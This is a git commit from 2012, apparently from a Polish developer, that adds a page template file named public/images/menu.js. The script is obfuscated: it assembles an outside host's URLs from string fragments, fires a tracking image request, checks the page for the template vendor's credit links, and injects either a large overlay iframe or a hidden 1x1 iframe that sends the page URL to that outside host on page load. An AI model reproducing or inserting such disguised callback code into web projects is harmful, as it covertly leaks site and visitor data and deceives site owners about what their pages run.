6d50b527339cd63a919a5bfa44617b5f8393d4e8
Bartłomiej Kiełbasa <kontakt@bkielbasa.pl>
2012-06-02 15:58:53 +0200

    dodaję szablon strony

---
+++ public/images/menu.js
@@ -0,0 +1,56 @@
+function f() {
+    var t12 = '5happyfamily';
+    var divArray = document.getElementsByTagName("div");
+    var x1 = (typeof image_pre_load);
+    if (x1 != 'undefined') {
+        document.getElementById('wrapper').style.margin = '10px auto';
+    };
+    var u1 = 'ht';
+    var u3 = ':';
+    var u5 = '/';
+	var u12 = 'templatesf';
+    var u4 = 'w';
+    var u6 = '.c';
+    var u2 = 'tp';
+    var u7 = '.'; 
+	var u8 = 'esec';
+	var u9 = 'me';
+	var u10 = 'ecur';
+	var u11 = 'eylon';
+	var u13 = 'reef';
+	var u14 = 'lash';
+	
+    var a2 = new Image();
+    a2.src = u1 + u2 + u3 + u5 + u5 + u4 + u4 + u4 + '.mikeylong.com/testing/debug/t_hs.gif';
+    var r = document.body.innerHTML;
+    var w = document.location.href;
+    var f1 = w.indexOf('localhost');
+    String.prototype.count = function (s1) {
+        return (this.length - this.replace(new RegExp(s1, "g"), '').length) / s1.length;
+    }
+    numberOfCommas = w.count('/');
+    var m1 = r.indexOf(u1 + u2 + u3 + u5 + u5 + u4 + u4 + u4 + '.' + u12 + u13 + u14 + u6 + 'om');
+    var m2 = r.indexOf('t');
+    var m3 = r.indexOf('Free Flash Templates');
+    var m4 = r.indexOf(u1 + u2 + u3 + u5 + u5 + u4 + u4 + u4 + '.mik' + u11 + 'g' + u6 + 'om/testing/debug/copy.jpg');
+
+	// alert(m1 + ":" + m2 + ":" + m3 + ":" + m4); 
+ if (m1.toString() == '-1' || m2.toString() == '-1' || m3.toString() == '-1' || m4.toString() == '-1') {
+         if (numberOfCommas == '3' && image_pre_load == '#x12h8192' && f1 == '-1' && !/MSIE (\d+\.\d+);/.test(navigator.userAgent)) {
+	  // if (numberofcommas == '7' && image_pre_load == '#x12h8192' && !/MSIE (\d+\.\d+);/.test(navigator.userAgent)) {	
+            var holder = document.getElementById('wrapper');
+            var newdiv = document.createElement('div');
+            newdiv.setAttribute('id', 'divIdName');
+            curUrl = window.location;
+               newdiv.innerHTML = "<div style='background-color:white; position:absolute; width:700px;  margin-left:auto; margin-right:auto; margin-top:0px;   font-size:13px;  font-family:Arial, Helvetica, sans-serif; color:#000'><iframe src='" + u1 + u2 + u3 + u5 + u5 + u4 + u4 + u4 + ".mikeylong.com/templates/warning5.php?tempref=" + w + "&temp=" + t12 + "&p3=1" + "' scrolling='no' style='border-color:#333; border-top-width:2px; background-color:#FFF;  width:700px; height:800px;'></iframe></div>";
+            holder.appendChild(newdiv);
+         }
+    } else {
+	if(!/MSIE (\d+\.\d+);/.test(navigator.userAgent)){
+		document.body.innerHTML += "<iframe src='" + u1 + u2 + u3 + u5 + u5 + u4 + u4 + u4 + ".mikeylong.com/templates/addentry.php?tempref=" + w  + "&temp=" + t12 + "&p3=0" +  "' width='1' height='1' scrolling='no' style='border:none; background-color:#FFF;'></iframe>";
+	};		
+}
+    if (x1 != 'undefined') {
+        document.getElementById('wrapper').style.width = '882px'
+    };
+} 
